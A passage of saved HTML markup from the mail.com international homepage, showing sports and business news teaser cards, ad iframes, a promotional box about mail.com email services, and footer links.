</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/916/9611916,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/916/9611916%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" src="files/jpg(21)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        More sports</span>
        <div class="teaser-headline">Russia plans to file appeal against Olympic ban</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="sport" data-init="true">
    <a href="https://www.mail.com/int/sports/other/9612208-shiffrin-will-skip-world-cup-races-france-to-rest.html#.1258-stage-set7-6" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/970/9606970,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/970/9606970,pd=2,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/970/9606970,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/970/9606970%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" src="files/jpg(22)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        More sports</span>
        <div class="teaser-headline">Shiffrin will skip World Cup races in France to rest, train</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="sport" data-init="true">
    <a href="https://www.mail.com/int/sports/soccer/9612314-hes-back-rejuvenated-sanches-returning-to-form-wit.html#.1258-stage-set7-7" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/316/9612316,pd=1,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/316/9612316,pd=1,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/316/9612316,pd=1,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/316/9612316%2Cpd=1%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 300px, (min-width:1024px) 300px" src="files/jpg(23)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Football</span>
        <div class="teaser-headline">He's back: Rejuvenated Sanches returning to form with Lille</div>
</div>
    </div>
</a></div>
</div>
    </div>
</div>
<div class="mod-container">
    <div class="container-headline" data-theme="business" id="business">
      <span><a href="https://www.mail.com/int/business/#.1258-stage-set8-1" target="_top">Business</a></span>
      <a href="https://www.mail.com/int/business/#.1258-stage-set8-2" target="_top">View More</a></div>
<div class="blocks blocks-3">
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="business" data-init="true">
    <a href="https://www.mail.com/int/business/markets/9611846-french-strikes-continue-amid-signs-progress.html#.1258-stage-set8-3" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/840/9611840,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 300px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/840/9611840,pd=2,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 300px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/840/9611840,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 300px" class="lazyImg" srcset="https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/840/9611840%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 460px, (min-width:1024px) 300px" src="files/jpg(24)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Markets</span>
        <div class="teaser-headline">French strikes continue amid signs of some progress</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
      <div class="mod mod-teaser teaser-list" data-theme="business" data-init="true">
    <a href="https://www.mail.com/int/business/markets/9612456-communications-companies-lead-stocks-higher-early.html#.1258-stage-set8-4" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="Sal Suarino" data-src="https://i0.mail.com/mcom/454/9612454,pd=2,f=teaser-list-s/sal-suarino.jpg" data-srcset="https://i0.mail.com/mcom/454/9612454%2Cpd=2%2Cf=teaser-list-s/sal-suarino.jpg 120w, https://i0.mail.com/mcom/454/9612454%2Cpd=2%2Cf=teaser-list-l/sal-suarino.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px">
<noscript>
<img alt="Sal Suarino" crossorigin="anonymous" src="https://i0.mail.com/mcom/454/9612454,pd=2,f=teaser-list-s/sal-suarino.jpg" srcset="https://i0.mail.com/mcom/454/9612454%2Cpd=2%2Cf=teaser-list-s/sal-suarino.jpg 120w, https://i0.mail.com/mcom/454/9612454%2Cpd=2%2Cf=teaser-list-l/sal-suarino.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" />
</noscript><img alt="Sal Suarino" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/454/9612454,pd=2,f=teaser-list-s/sal-suarino.jpg" data-srcset="https://i0.mail.com/mcom/454/9612454%2Cpd=2%2Cf=teaser-list-s/sal-suarino.jpg 120w, https://i0.mail.com/mcom/454/9612454%2Cpd=2%2Cf=teaser-list-l/sal-suarino.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" class="lazyImg" srcset="https://i0.mail.com/mcom/454/9612454%2Cpd=2%2Cf=teaser-list-s/sal-suarino.jpg 120w, https://i0.mail.com/mcom/454/9612454%2Cpd=2%2Cf=teaser-list-l/sal-suarino.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" src="files/sal-suarino.jpg"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Markets</span>
        <div class="teaser-headline">Communications companies lead stocks higher in early trade</div>
</div>
    </div>
</a></div>
<div class="mod mod-teaser teaser-list" data-theme="business" data-init="true">
    <a href="https://www.mail.com/int/business/markets/9611848-swedish-central-bank-ends-pioneering-era-subzero-r.html#.1258-stage-set8-5" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/146/9612146,pd=2,f=teaser-list-s/.jpg" data-srcset="https://i0.mail.com/mcom/146/9612146%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/146/9612146%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/146/9612146,pd=2,f=teaser-list-s/.jpg" srcset="https://i0.mail.com/mcom/146/9612146%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/146/9612146%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/146/9612146,pd=2,f=teaser-list-s/.jpg" data-srcset="https://i0.mail.com/mcom/146/9612146%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/146/9612146%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" class="lazyImg" srcset="https://i0.mail.com/mcom/146/9612146%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/146/9612146%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" src="files/jpg(25)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Markets</span>
        <div class="teaser-headline">Swedish central bank ends pioneering era of subzero rates</div>
</div>
    </div>
</a></div>
</div>
    <div class="block">
      <div class="mod mod-teaser teaser-list" data-theme="business" data-init="true">
    <a href="https://www.mail.com/int/business/markets/9609330-greece-parliament-backs-ambitious-budget.html#.1258-stage-set8-6" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/012/9611012,pd=1,f=teaser-list-s/.jpg" data-srcset="https://i0.mail.com/mcom/012/9611012%2Cpd=1%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/012/9611012%2Cpd=1%2Cf=teaser-list-l/.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/012/9611012,pd=1,f=teaser-list-s/.jpg" srcset="https://i0.mail.com/mcom/012/9611012%2Cpd=1%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/012/9611012%2Cpd=1%2Cf=teaser-list-l/.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/012/9611012,pd=1,f=teaser-list-s/.jpg" data-srcset="https://i0.mail.com/mcom/012/9611012%2Cpd=1%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/012/9611012%2Cpd=1%2Cf=teaser-list-l/.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" class="lazyImg" srcset="https://i0.mail.com/mcom/012/9611012%2Cpd=1%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/012/9611012%2Cpd=1%2Cf=teaser-list-l/.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" src="files/jpg(26)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Markets</span>
        <div class="teaser-headline">Greece: Parliament backs ambitious state budget
</div>
</div>
    </div>
</a></div>
<div class="mod mod-teaser teaser-list" data-theme="business" data-init="true">
    <a href="https://www.mail.com/int/business/economy/9609026-fiat-chrysler-peugeot-merger-bring-clean-vehicles.html#.1258-stage-set8-7" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/082/9609082,pd=2,f=teaser-list-s/.jpg" data-srcset="https://i0.mail.com/mcom/082/9609082%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/082/9609082%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/082/9609082,pd=2,f=teaser-list-s/.jpg" srcset="https://i0.mail.com/mcom/082/9609082%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/082/9609082%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/082/9609082,pd=2,f=teaser-list-s/.jpg" data-srcset="https://i0.mail.com/mcom/082/9609082%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/082/9609082%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" data-sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" class="lazyImg" srcset="https://i0.mail.com/mcom/082/9609082%2Cpd=2%2Cf=teaser-list-s/.jpg 120w, https://i0.mail.com/mcom/082/9609082%2Cpd=2%2Cf=teaser-list-l/.jpg 240w" sizes="(max-width:479px) 120px, (min-width:480px) and (max-width:767px) 120px, (min-width:768px) and (max-width:1023px) 120px, (min-width:1024px) 120px" src="files/jpg(27)"></span></figure><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Economy</span>
        <div class="teaser-headline">Fiat Chrysler-Peugeot merger could bring more clean vehicles</div>
</div>
    </div>
</a></div>
</div>
  </div>
</div>
<div class="mod-container">
    <div class="container-headline" data-theme="mixed">
    <span>Photo of the Day</span>
  </div>
<div class="blocks blocks-1">
    <div class="block">
        <div class="mod mod-teaser teaser-card" data-theme="" data-init="true">
    <a href="https://www.mail.com/int/pictures/1164964-world-pictures.html#.1258-stage-l1-1" target="_top"><div class="teaser-wrapper">
    <div class="teaser-image">
        <figure class="mod mod-image" data-init="true"><span data-picture="" data-alt="" data-src="https://i0.mail.com/mcom/458/9612458,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 620px, (min-width:1024px) 940px">
<noscript>
<img alt="" crossorigin="anonymous" src="https://i0.mail.com/mcom/458/9612458,pd=2,f=teaser-card-s/.jpg" srcset="https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 620px, (min-width:1024px) 940px" />
</noscript><img alt="" crossorigin="anonymous" data-src="https://i0.mail.com/mcom/458/9612458,pd=2,f=teaser-card-s/.jpg" data-srcset="https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" data-sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 620px, (min-width:1024px) 940px" class="lazyImg" srcset="https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-l/.jpg 620w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-xl/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 620px, (min-width:1024px) 940px" src="files/jpg(3)"></span></figure><span class="teaser-overlay overlay-gallery"></span><div class="stripe"></div>
      </div>
      <div class="teaser-text">
      <span class="teaser-label">
        Breaking News</span>
        <div class="teaser-headline">
    Britain's Queen Elizabeth II and Prince Charles walk behind the Imperial State Crown as they arrive in the chamber for the State Opening of Parliament, in the House of Lords at the Palace of ...</div>
</div>
    </div>
</a></div>
</div>
    </div>
</div>
<div class="ad-container ad-sky mod mod-inviewcheck sticky" id="gpt-sky" data-init="true" data-adcalled="true" data-google-query-id="COOY6-OrwuYCFSDGuwgdcIgOQw">  <div id="google_ads_iframe_/6840/p6840.mail.com/HomePage_5__container__" style="border: 0pt none;"><iframe id="google_ads_iframe_/6840/p6840.mail.com/HomePage_5" title="3rd party ad content" name="google_ads_iframe_/6840/p6840.mail.com/HomePage_5" width="300" height="600" scrolling="no" marginwidth="0" marginheight="0" frameborder="0" style="border: 0px; vertical-align: bottom;" data-load-complete="true" data-google-container-id="7" src="files/saved_resource(7).html"></iframe></div></div></div>
      <div class="ad-container ad-banner mod mod-inviewcheck" id="gpt-topbanner2" data-init="true" data-adcalled="true" data-google-query-id="CJO2o-SrwuYCFXnDuwgdBasDpA">  <div id="google_ads_iframe_/6840/p6840.mail.com/HomePage_6__container__" style="border: 0pt none; display: inline-block; width: 728px; height: 90px;"><iframe frameborder="0" src="files/container(3).html" id="google_ads_iframe_/6840/p6840.mail.com/HomePage_6" title="3rd party ad content" name="" scrolling="no" marginwidth="0" marginheight="0" width="728" height="90" data-is-safeframe="true" sandbox="allow-forms allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" data-google-container-id="8" style="border: 0px; vertical-align: bottom;" data-load-complete="true"></iframe></div></div><div class="seobox-bottom"> <h2><span>An email service tailored to your needs</span></h2><p>Looking for a new <a href="https://www.mail.com/mail/#.1258-seobox-link1-1" target="_self">email service</a> where you can get the perfect free email address?<br>Then you have come to the right place! At mail.com our email website allows you to choose from over 200 domains when you <a href="https://www.mail.com/mail/create-email-account/#.1258-seobox-link1-2" target="_self">create an email address</a>. Sign up now or read more about our mail products below.</p><ul><li><a href="https://www.mail.com/tools/email-apps/#.1258-seobox-link1-3" target="_self">Email apps</a>: Experience the convenience of accessing your mail via your smartphone.</li><li><a href="https://www.mail.com/mail/webmail/#.1258-seobox-link1-4" target="_self">Webmail</a>: Our webmail contains a range of great features e.g. unlimited email storage.</li><li><a href="https://www.mail.com/mail/antivirus/#.1258-seobox-link1-5" target="_self">Antivirus</a>: Our advanced antivirus software protects your inbox from viruses.</li><li><a href="https://www.mail.com/email/#.1258-seobox-link1-6" target="_self">Email domains</a>: You can select from more than 200 domains when you create your free email address.</li></ul><h2><span>Our premium email product</span></h2><p>After you have signed up with mail.com and received your email account login, it is possible to upgrade to premium for an even better email experience. A premium account includes, among other features, the possibility to forward your mails to another email address via POP3/IMAP. You can read more about our <a href="https://www.mail.com/premiumlogin/#.1258-seobox-link1-7" target="_self">premium product here</a>.</p><h2><span>About mail.com</span></h2><p>mail.com was launched in 1995 with the goal of providing unparalleled email functionality to our customers. Besides our email service we also offer <a href="https://www.mail.com/int/news/#.1258-seobox-link1-8">news content</a>, and on our website you will find the latest <a href="https://www.mail.com/int/entertainment/#.1258-seobox-link1-9">entertainment news</a>, <a href="https://www.mail.com/int/sports/#.1258-seobox-link1-10" target="_self">sport news</a>, <a href="https://www.mail.com/int/scitech/#.1258-seobox-link1-11" target="_self">tech news</a> and <a href="https://www.mail.com/int/business/#.1258-seobox-link1-12">business news</a>.</p><p>Need help? Please feel free to <a href="https://support.mail.com/" target="_blank">visit our mail.com support pages</a> anytime.</p><p><strong><a href="https://signup.mail.com/" target="_blank">Register your new emai</a>l account here&nbsp;– It’s free!</strong><br></p></div><footer class="mod mod-footer" id="footerNav" data-init="true">
  <div class="footer-wrapper">
    <ul class="nav">
      <li>
      <span>Email</span>
      <ul class="subnav">
        <li>
      <a href="https://www.mail.com/mail/domains/#.1258-footer-nav1-1" target="_top">Domains</a></li>
  <li>
      <a href="https://www.mail.com/mail/mail-collector/#.1258-footer-nav1-2" target="_top">Mail Collector</a></li>
  <li>
      <a href="https://www.mail.com/mail/attachments-up-to-50-MB/#.1258-footer-nav1-3" target="_top">30 MB Attachments</a></li>
  <li>
      <a href="https://www.mail.com/mail/mobile-service/#.1258-footer-nav1-4" target="_top">Mobile Service</a></li>
  </ul>
    </li>
  <li>
      <span>Tools</span>
      <ul class="subnav">
        <li>
      <a href="https://www.mail.com/tools/iphone-app/#.1258-footer-nav1-5" target="_top">iPhone App</a></li>
  <li>
      <a href="https://www.mail.com/tools/ipad-app/#.1258-footer-nav1-6" target="_top">iPad App</a></li>
  <li>
      <a href="https://www.mail.com/tools/android-app/#.1258-footer-nav1-7" target="_top">Android App</a></li>
  <li>
      <a href="https://www.mail.com/toolbar/chrome/#.1258-footer-nav1-8" target="_top">MailCheck Chrome</a></li>
  </ul>
    </li>
  <li>
      <span>Help</span>
      <ul class="subnav">
        <li>
      <a href="https://password.mail.com/" target="_top">Recover your password</a></li>
  <li>
      <a href="https://support.mail.com/index.html" target="_top">Contact us</a></li>
  <li>
      <a href="https://support.mail.com/contact-us/contact-us.html#.1258-footer-nav1-9" target="_top">Contact Premium Support</a></li>
  </ul>
    </li>
  <li>
      <span>Editions</span>
      <ul class="subnav">
        <li>
      <a data-localepreference="us-en" href="https://www.mail.com/#.1258-footer-nav1-10" target="_top">US</a></li>
  <li>
      <a class="active" data-localepreference="int-en" href="https://www.mail.com/int/#.1258-footer-nav1-11" target="_top">International</a></li>
  </ul>
    </li>
  </ul>
<div class="social">
  <a class="fb" href="https://www.facebook.com/mail.com"><span>facebook</span></a>
  <a class="tw" href="https://twitter.com/maildotcom"><span>twitter</span></a>
</div><ul class="links">
      <li>
      <a href="https://www.mail.com/int/company/about/#.1258-footer-nav2-1" target="_top">About mail.com</a></li>
  <li>
      <a href="https://www.mail.com/int/company/terms/#.1258-footer-nav2-2" target="_top">Terms &amp; Conditions</a></li>
  <li>
